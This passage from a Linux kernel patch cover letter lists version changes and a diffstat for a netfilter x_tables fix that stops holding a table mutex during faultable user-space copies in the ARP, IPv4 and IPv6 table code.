  - Keep the fixed-size GET_INFO copy outside table locks and brace compat
    lookup error arms.
  - Clarify ARP-only runtime coverage, privilege scope, helper build,
    holder/waiter evidence, QEMU configuration, and the NOT RUN
    crash-log status.
  - Regenerate the numbered patch and cover with LF line endings; use the
    standard 0001-*.patch filename.
  - v2 Link:
    https://lore.kernel.org/all/cover.1788961415.git.zihanx@nebusec.ai/
changes in v2:
  - Rebase onto current nf.git after 0bd7ed1a3263c
    ("netfilter: arp_tables: remove the 32bit compat interface").
    ARP GET_INFO and GET_ENTRIES use native paths only; IPv4 and IPv6
    retain compat handling.
  - Drop hung_task_panic and the 10-second hung_task timeout from the
    reproducer, as pointed out by Pablo Neira Ayuso; observe holder/waiter
    wchan instead.
  - v1 Link:
    https://lore.kernel.org/all/cover.1788244146.git.zihanx@nebusec.ai/

---
Zihan Xi (1):
  netfilter: x_tables: avoid holding mutex over faultable user copies

 net/ipv4/netfilter/arp_tables.c | 49 ++++++++++++++++---
 net/ipv4/netfilter/ip_tables.c  | 87 +++++++++++++++++++++++++++++----
 net/ipv6/netfilter/ip6_tables.c | 87 +++++++++++++++++++++++++++++----
 3 files changed, 197 insertions(+), 26 deletions(-)

-- 
2.55.0.windows.3

